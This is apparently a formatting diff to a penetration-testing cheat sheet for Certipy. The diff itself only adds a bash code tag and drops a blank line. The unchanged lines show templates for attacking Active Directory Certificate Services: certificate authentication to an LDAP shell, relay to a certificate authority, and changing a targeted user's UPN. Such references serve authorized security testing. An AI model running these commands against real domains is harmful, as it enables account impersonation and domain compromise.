@@ -72,7 +72,7 @@ certipy auth -pfx <pfx-file>  -domain <domain_fqdn> -username <user> -dc-ip <dc_
 
 ## auth - authenticate through LDAP (Schannel) with pfx certificate
 #plateform/linux #target/remote #cat/CONNECT
-```
+```bash
 certipy auth -pfx <pfx-file> -dc-ip <dc_ip> -ldap-shell
 ```
 
@@ -129,7 +129,6 @@ certipy relay -target "rpc://<ca_name>.<domain_fqdn>" -dc-ip <dc_ip> -ns <dc_ip>
 ```
 certipy account update -u <user>@<domain_fqdn> -p '<password>' -dc-ip <dc_ip> -ns <dc_ip> -dns-tcp  -user <targeted-user> -upn <target_upn>
 ```
-
 
 ## account - add computer
 #plateform/linux #target/remote #cat/ATTACK
